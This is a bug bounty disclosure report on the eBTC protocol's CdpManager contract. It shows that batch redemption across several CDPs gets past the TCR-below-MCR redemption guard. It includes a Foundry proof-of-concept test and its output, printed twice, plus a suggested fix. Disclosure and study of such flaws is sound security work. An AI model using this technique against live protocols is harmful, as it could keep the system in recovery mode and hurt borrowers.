# 28849 - \[SC - Low] Using batchRedemption even if the TCR becomes s...

Submitted on Feb 28th 2024 at 21:07:22 UTC by @cryptoticky for [Boost | eBTC](https://immunefi.com/bounty/ebtc-boost/)

Report ID: #28849

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/ebtc-protocol/ebtc/blob/release-0.7/packages/contracts/contracts/CdpManager.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
* Protocol insolvency

## Description

## Brief/Intro

When the TCR is smaller than the MCR, the TCR continues to be smaller if redeemer redeem debt token, and to suppress this, eBTC protocol does not allow redeem debt token when the TCR is smaller than the MCR.

## Vulnerability Details

<https://docs.ebtc.finance/ebtc/protocol-mechanics/redemptions> ![img.png](https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/BadgerDAO%20\(eBTC\)/img.png)

As you can see on the redemption description page, Redemptions are disabled whenever the Total Collateral Ratio (TCR) goes below the Minimum Collateral Ratio (MCR) of 110%.

* CdpManager.sol:line 354

```solidity
_requireTCRisNotBelowMCR(totals.price, totals.tcrAtStart);
```

The problem is that an attacker can bypass this require and continue to redeem it even when the TCR is smaller than the MCR.

### Attack Scenario

Let's look at the case where TCR is very close to MCR and larger than the MCR, but now TCR becomes smaller than the MCR with full redemption to the first ICR that is larger than the MCR. When this redemption is made, TCR becomes smaller than MCR, so the redemption cannot proceed until TCR becomes larger than MCR again.

However, if an attacker redeems multiple CDPs, not just CDP(the first ICR), multiple redemptions can proceed despite the fact that the TCR is smaller than the MCR with the repayment of the first CDP.

Attached below is the PoC test code explaining these scenarios.

You can create PoC\_CDPManager.redemptions.t.sol file in foundry\_test folder.

And run this in terminal.

`forge test -vvv --match-contract PoC_CDPManagerRedemptionsTest`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../contracts/Dependencies/EbtcMath.sol";
import {eBTCBaseInvariants} from "./BaseInvariants.sol";

contract PoC_CDPManagerRedemptionsTest is eBTCBaseInvariants {
    address user;
    bytes32 cdpId0;
    bytes32 cdpId1;
    bytes32 cdpId2;

    function setUp() public override {
        super.setUp();
        connectCoreContracts();
        connectLQTYContractsToCore();
        vm.warp(3 weeks);


        console.log("\n");

        console.log("========= Configration ==========");
        user = _utils.getNextUserAddress();

        // --- open cdps ---
        _singleCdpSetupWithICR(user, 130e16);
        _singleCdpSetupWithICR(user, 130e16);
        _singleCdpSetupWithICR(user, 130e16);
        (, cdpId0) = _singleCdpSetupWithICR(user, 130e16);
        (, cdpId1) = _singleCdpSetupWithICR(user, 140e16);
        (, cdpId2) = _singleCdpSetupWithICR(user, 142e16);

        uint256 price = priceFeedMock.getPrice();
        uint256 TCR = cdpManager.getCachedTCR(price);

        console.log("Set price for: MCR < TCR < FirstIcrGteMcr");
        price = price * 100 / 121;
        priceFeedMock.setPrice(price);

        uint256 icr0 = cdpManager.getSyncedICR(cdpId0, price);
        uint256 icr1 = cdpManager.getSyncedICR(cdpId1, price);
        uint256 icr2 = cdpManager.getSyncedICR(cdpId2, price);
        console.log("CDP0Icr: ", icr0);
        console.log("CDP1Icr: ", icr1);
        console.log("CDP2Icr: ", icr2);

        TCR = cdpManager.getCachedTCR(price);
        console.log("TCRBeforeRedemption: ", TCR);

        console.log("\n");
    }

    function test_PoC1SingleRedemption() public {
        console.log("------- Test SingleRedemption -------");
        console.log("- Redeem CDP1 fully");
        uint256 _redeemedDebt = cdpManager.getCdpDebt(cdpId1);
        _performRedemption(user, _redeemedDebt, cdpId1, cdpId1);
        uint256 price = priceFeedMock.getPrice();
        uint256 TCR = cdpManager.getCachedTCR(price);

        console.log("TCRAfterFirstRedemption: ", TCR);


        console.log("- Try to Redeem CDP2 fully");
        _redeemedDebt = cdpManager.getCdpDebt(cdpId2);
        (bytes32 firstRedemptionHint, uint256 partialRedemptionHintNICR, , ) = hintHelpers
            .getRedemptionHints(_redeemedDebt, priceFeedMock.fetchPrice(), 0);
        _syncSystemDebtTwapToSpotValue();
        vm.startPrank(user);
        vm.expectRevert("CdpManager: Cannot redeem when TCR < MCR");
        cdpManager.redeemCollateral(
            _redeemedDebt,
            firstRedemptionHint,
            cdpId2,
            cdpId2,
            partialRedemptionHintNICR,
            0,
            1e18
        );
        vm.stopPrank();

        console.log(("Revert - CdpManager: Cannot redeem when TCR < MCR"));

        console.log("The require works very well in this case!!!");

    }

    function test_PoC2MultiRedemption() public {
        console.log("------- Test MultiRedemption -------");
        console.log("- Redeem CDP1 and CDP2 fully");
        uint256 _redeemedDebt = cdpManager.getCdpDebt(cdpId1) + cdpManager.getCdpDebt(cdpId2);
        _performRedemption(user, _redeemedDebt, cdpId1, cdpId2);
        uint256 price = priceFeedMock.getPrice();
        uint256 TCR = cdpManager.getCachedTCR(price);

        console.log("TCRAfterMultiRedemption: ", TCR);

        console.log("!!!CdpManager.redeemCollateral doesn't check (TCR < MCR) since the second CDPs!!!");

    }

    function _singleCdpSetupWithICR(address _usr, uint256 _icr) internal returns (address, bytes32) {
        uint256 _price = priceFeedMock.fetchPrice();
        uint256 _coll = cdpManager.MIN_NET_STETH_BALANCE() * 2;
        uint256 _debt = (_coll * _price) / _icr;
        bytes32 _cdpId = _openTestCDP(_usr, _coll + cdpManager.LIQUIDATOR_REWARD(), _debt);
        uint256 _cdpICR = cdpManager.getCachedICR(_cdpId, _price);
        return (_usr, _cdpId);
    }

    function _performRedemption(
        address _redeemer,
        uint256 _redeemedDebt,
        bytes32 _upperPartialRedemptionHint,
        bytes32 _lowerPartialRedemptionHint
    ) internal {
        (bytes32 firstRedemptionHint, uint256 partialRedemptionHintNICR, , ) = hintHelpers
            .getRedemptionHints(_redeemedDebt, priceFeedMock.fetchPrice(), 0);
        _syncSystemDebtTwapToSpotValue();
        vm.prank(_redeemer);
        cdpManager.redeemCollateral(
            _redeemedDebt,
            firstRedemptionHint,
            _upperPartialRedemptionHint,
            _lowerPartialRedemptionHint,
            partialRedemptionHintNICR,
            0,
            1e18
        );
    }
}

```

The result:

```
Ran 2 tests for foundry_test/PoC_CDPManager.redemptions.t.sol:PoC_CDPManagerRedemptionsTest
[PASS] test_PoC1SingleRedemption() (gas: 652421)
Logs:
  block.timestamp 1
  

  ========= Configration ==========
  Set price for: MCR < TCR < FirstIcrGteMcr
  CDP0Icr:  1074380165289256190
  CDP1Icr:  1157024793388429741
  CDP2Icr:  1173553719008264454
  TCRBeforeRedemption:  1103047565120524000
  

  ------- Test SingleRedemption -------
  - Redeem CDP1 fully
  TCRAfterFirstRedemption:  1092850884463283517
  - Try to Redeem CDP2 fully
  Revert - CdpManager: Cannot redeem when TCR < MCR
  The require works very well in this case!!!

[PASS] test_PoC2MultiRedemption() (gas: 617344)
Logs:
  block.timestamp 1
  

  ========= Configration ==========
  Set price for: MCR < TCR < FirstIcrGteMcr
  CDP0Icr:  1074380165289256190
  CDP1Icr:  1157024793388429741
  CDP2Icr:  1173553719008264454
  TCRBeforeRedemption:  1103047565120524000
  

  ------- Test MultiRedemption -------
  - Redeem CDP1 and CDP2 fully
  TCRAfterMultiRedemption:  1074380165289256190
  !!!CdpManager.redeemCollateral doesn't check (TCR < MCR) since the second CDPs!!!

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 23.33ms

```

## Impact Details

An attacker can exploit this vulnerability to send the TCR quickly down the MCR and launch an attack whenever the TCR rises above the MCR to prevent the protocol from returning to normal. There is no direct benefit to the attacker, but it interferes with the normal operation of the protocol, which continues to be present in recovery mode. This prevents the borrowers from disposing of their CDP, resulting in the destruction of community. If this continues, the protocol will go bankrupt.

## References

To solve this vulnerability, we can simply check the TCR whenever the function proceeds with a CDP.

We can modify CdpManager.sol:393-395 lines like

```solidity
while (
    currentBorrower != address(0) && totals.remainingDebtToRedeem > 0 && _maxIterations > 0 && _requireTCRisNotBelowMCR(totals.price, getCachedTCR(totals.price))
) {
```

## Proof of Concept

### Attack Scenario

Let's look at the case where TCR is very close to MCR and larger than the MCR, but now TCR becomes smaller than the MCR with full redemption to the first ICR that is larger than the MCR. When this redemption is made, TCR becomes smaller than MCR, so the redemption cannot proceed until TCR becomes larger than MCR again.

However, if an attacker redeems multiple CDPs, not just CDP(the first ICR), multiple redemptions can proceed despite the fact that the TCR is smaller than the MCR with the repayment of the first CDP.

Attached below is the PoC test code explaining these scenarios.

You can create PoC\_CDPManager.redemptions.t.sol file in foundry\_test folder.

And run this in terminal.

`forge test -vvv --match-contract PoC_CDPManagerRedemptionsTest`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../contracts/Dependencies/EbtcMath.sol";
import {eBTCBaseInvariants} from "./BaseInvariants.sol";

contract PoC_CDPManagerRedemptionsTest is eBTCBaseInvariants {
    address user;
    bytes32 cdpId0;
    bytes32 cdpId1;
    bytes32 cdpId2;

    function setUp() public override {
        super.setUp();
        connectCoreContracts();
        connectLQTYContractsToCore();
        vm.warp(3 weeks);


        console.log("\n");

        console.log("========= Configration ==========");
        user = _utils.getNextUserAddress();

        // --- open cdps ---
        _singleCdpSetupWithICR(user, 130e16);
        _singleCdpSetupWithICR(user, 130e16);
        _singleCdpSetupWithICR(user, 130e16);
        (, cdpId0) = _singleCdpSetupWithICR(user, 130e16);
        (, cdpId1) = _singleCdpSetupWithICR(user, 140e16);
        (, cdpId2) = _singleCdpSetupWithICR(user, 142e16);

        uint256 price = priceFeedMock.getPrice();
        uint256 TCR = cdpManager.getCachedTCR(price);

        console.log("Set price for: MCR < TCR < FirstIcrGteMcr");
        price = price * 100 / 121;
        priceFeedMock.setPrice(price);

        uint256 icr0 = cdpManager.getSyncedICR(cdpId0, price);
        uint256 icr1 = cdpManager.getSyncedICR(cdpId1, price);
        uint256 icr2 = cdpManager.getSyncedICR(cdpId2, price);
        console.log("CDP0Icr: ", icr0);
        console.log("CDP1Icr: ", icr1);
        console.log("CDP2Icr: ", icr2);

        TCR = cdpManager.getCachedTCR(price);
        console.log("TCRBeforeRedemption: ", TCR);

        console.log("\n");
    }

    function test_PoC1SingleRedemption() public {
        console.log("------- Test SingleRedemption -------");
        console.log("- Redeem CDP1 fully");
        uint256 _redeemedDebt = cdpManager.getCdpDebt(cdpId1);
        _performRedemption(user, _redeemedDebt, cdpId1, cdpId1);
        uint256 price = priceFeedMock.getPrice();
        uint256 TCR = cdpManager.getCachedTCR(price);

        console.log("TCRAfterFirstRedemption: ", TCR);


        console.log("- Try to Redeem CDP2 fully");
        _redeemedDebt = cdpManager.getCdpDebt(cdpId2);
        (bytes32 firstRedemptionHint, uint256 partialRedemptionHintNICR, , ) = hintHelpers
            .getRedemptionHints(_redeemedDebt, priceFeedMock.fetchPrice(), 0);
        _syncSystemDebtTwapToSpotValue();
        vm.startPrank(user);
        vm.expectRevert("CdpManager: Cannot redeem when TCR < MCR");
        cdpManager.redeemCollateral(
            _redeemedDebt,
            firstRedemptionHint,
            cdpId2,
            cdpId2,
            partialRedemptionHintNICR,
            0,
            1e18
        );
        vm.stopPrank();

        console.log(("Revert - CdpManager: Cannot redeem when TCR < MCR"));

        console.log("The require works very well in this case!!!");

    }

    function test_PoC2MultiRedemption() public {
        console.log("------- Test MultiRedemption -------");
        console.log("- Redeem CDP1 and CDP2 fully");
        uint256 _redeemedDebt = cdpManager.getCdpDebt(cdpId1) + cdpManager.getCdpDebt(cdpId2);
        _performRedemption(user, _redeemedDebt, cdpId1, cdpId2);
        uint256 price = priceFeedMock.getPrice();
        uint256 TCR = cdpManager.getCachedTCR(price);

        console.log("TCRAfterMultiRedemption: ", TCR);

        console.log("!!!CdpManager.redeemCollateral doesn't check (TCR < MCR) since the second CDPs!!!");

    }

    function _singleCdpSetupWithICR(address _usr, uint256 _icr) internal returns (address, bytes32) {
        uint256 _price = priceFeedMock.fetchPrice();
        uint256 _coll = cdpManager.MIN_NET_STETH_BALANCE() * 2;
        uint256 _debt = (_coll * _price) / _icr;
        bytes32 _cdpId = _openTestCDP(_usr, _coll + cdpManager.LIQUIDATOR_REWARD(), _debt);
        uint256 _cdpICR = cdpManager.getCachedICR(_cdpId, _price);
        return (_usr, _cdpId);
    }

    function _performRedemption(
        address _redeemer,
        uint256 _redeemedDebt,
        bytes32 _upperPartialRedemptionHint,
        bytes32 _lowerPartialRedemptionHint
    ) internal {
        (bytes32 firstRedemptionHint, uint256 partialRedemptionHintNICR, , ) = hintHelpers
            .getRedemptionHints(_redeemedDebt, priceFeedMock.fetchPrice(), 0);
        _syncSystemDebtTwapToSpotValue();
        vm.prank(_redeemer);
        cdpManager.redeemCollateral(
            _redeemedDebt,
            firstRedemptionHint,
            _upperPartialRedemptionHint,
            _lowerPartialRedemptionHint,
            partialRedemptionHintNICR,
            0,
            1e18
        );
    }
}

```

The result:

```
Ran 2 tests for foundry_test/PoC_CDPManager.redemptions.t.sol:PoC_CDPManagerRedemptionsTest
[PASS] test_PoC1SingleRedemption() (gas: 652421)
Logs:
  block.timestamp 1
  

  ========= Configration ==========
  Set price for: MCR < TCR < FirstIcrGteMcr
  CDP0Icr:  1074380165289256190
  CDP1Icr:  1157024793388429741
  CDP2Icr:  1173553719008264454
  TCRBeforeRedemption:  1103047565120524000
  

  ------- Test SingleRedemption -------
  - Redeem CDP1 fully
  TCRAfterFirstRedemption:  1092850884463283517
  - Try to Redeem CDP2 fully
  Revert - CdpManager: Cannot redeem when TCR < MCR
  The require works very well in this case!!!

[PASS] test_PoC2MultiRedemption() (gas: 617344)
Logs:
  block.timestamp 1
  

  ========= Configration ==========
  Set price for: MCR < TCR < FirstIcrGteMcr
  CDP0Icr:  1074380165289256190
  CDP1Icr:  1157024793388429741
  CDP2Icr:  1173553719008264454
  TCRBeforeRedemption:  1103047565120524000
  

  ------- Test MultiRedemption -------
  - Redeem CDP1 and CDP2 fully
  TCRAfterMultiRedemption:  1074380165289256190
  !!!CdpManager.redeemCollateral doesn't check (TCR < MCR) since the second CDPs!!!

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 23.33ms

```
